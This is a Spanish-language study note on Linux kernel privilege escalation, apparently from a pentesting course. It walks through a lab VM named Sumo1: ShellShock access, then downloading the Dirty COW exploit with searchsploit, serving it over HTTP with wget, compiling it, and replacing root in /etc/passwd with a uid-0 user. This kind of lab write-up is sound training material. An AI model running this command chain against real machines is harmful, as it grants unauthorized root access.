-----
- Tags: #privilege #escalation 
-----
# Definición

> El **kernel** es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el kernel puede tener graves consecuencias para la seguridad del sistema.

En versiones antiguas del kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (**root**) en el sistema.

Las vulnerabilidades del kernel pueden ser explotadas de varias maneras. Por ejemplo, un atacante podría aprovechar una vulnerabilidad en un controlador de dispositivo para obtener acceso al kernel y realizar operaciones maliciosas. Otra forma común en que se explotan las vulnerabilidades del kernel es mediante el uso de técnicas de desbordamiento de búfer, que permiten a los atacantes escribir código malicioso en áreas de memoria reservadas para el kernel.

Para mitigar el riesgo de vulnerabilidades del kernel, es importante mantener actualizado el sistema operativo y aplicar parches de seguridad tan pronto como estén disponibles.

# Explotación del Kernel

## Máquina Sumo

Para este ejemplo de explotación del **Kernel** lo mostraremos a partir de una máquina virtual llamada "**Sumo1**" la cual posee una versión antigua del Kernel.

Una vez montada y encendida la máquina, debemos realizar un reconocimiento básico hasta encontrar un servicio web que posee un **directorio** llamado ``/cgi-bin/`` el cual recordemos es una vía potencial para efectuar un [[Ataque ShellShock]], por lo tanto intentaremos efectuar el mismo.

Cuando ya tengamos acceso a la máquina, con el tratamiento de la Shell efectuado por completo, es momento de explotar el **Kernel**.

------

Si realizamos un ``lsb_release -a`` y luego un ``uname -a`` podemos ver la versión del **Kernel** luego del segundo comando.

![[Kernel 1.png]]

Ahora con la herramienta ``searchsploit`` haremos un ``searchsploit kernel 3.2`` para ver los Exploits existentes para esta versión de Kernel. Tras ver todas las posibilidades veremos que hay muchas de ellas que en su nombre indican una cadena "**Dirty Cow**" y que todos están programados en el lenguaje **C**. 

> **Dirty COW** es una vulnerabilidad de seguridad informática del kernel de Linux que afectó a todos los sistemas operativos basados ​​en Linux, incluidos los dispositivos Android, que usaban versiones anteriores del kernel de Linux creadas antes de 2018.

El que vamos a usar de todos los que aparecen es el siguiente

![[Kernel 2.png]]

Este CVE lo que hace es modificar el ``/etc/passwd`` **eliminando** el usuario *root* y creando uno personalizado en su lugar con el **identificador de usuario** (``0``) correspondiente a root. Por lo tanto lo que haremos será copiar su **Código de Path** y realizar un ``searchsploit -m linux/local/40839.c`` para descargarlo. Ahora podemos **modificar su nombre** para que sea mas reconocible.

Lo que queda ahora es transferirlo a la máquina víctima, en mi caso lo voy a hacer montando un servidor en el mismo directorio en el que está el binario, todo esto con **python3** tal que ``python3 -m http.server 80`` y luego en la otra máquina realizamos un ``wget http://192.168.0.194/dirty-cow.c``, de esta forma ya transferimos el **Script malicioso** correctamente.

----------

Una vez tengamos el Script en la máquina víctima lo que vamos a hacer es un ``cat dirty-cow.c | grep gcc`` ya que normalmente **estos Scripts te indican que es lo que debemos ejecutar**.

El comando anterior nos devolverá lo siguiente

- ``gcc -pthread dirty-cow.c -o dirty -lcrypt``

Por lo tanto lo vamos a ejecutar pero sin antes cambiar el **PATH** de la siguiente manera ``PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH``, ya que ``gcc`` emplea librerías modernas y recordemos que esta máquina posee un sistema antiguo.

De esta forma tendríamos nuestro **binario ejecutable** por lo tanto hacemos un ``./dirty``, esto nos dará un mensaje que dice "``/etc/passwd successfully backed up to /tmp/passwd.bak``" y nos pedirá que creemos una contraseña para el usuario privilegiado, en mi caso será *test*. ==Cabe aclarar que tenemos que esperar un minuto hasta que termine de realizar todo el procedimiento==

Si ahora revisamos el ``/etc/passwd`` veremos que en donde estaba el usuario *root*, aparecerá un usuario llamado *firefart*, por lo tanto debemos ingresar a el con la contraseña que creamos previamente.

![[Kernel 3.png]]

Si realizamos un ``id`` veremos que **poseemos el identificador de usuario** (``0``)

------
## Herramienta LES (Linux Exploit Suggester)

Existe una herramienta llamada [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) que una vez la ejecutemos dentro de la máquina víctima **realizará un escaneo** que buscará formas potenciales de escalar nuestro privilegio **basándose en el Kernel actual**.
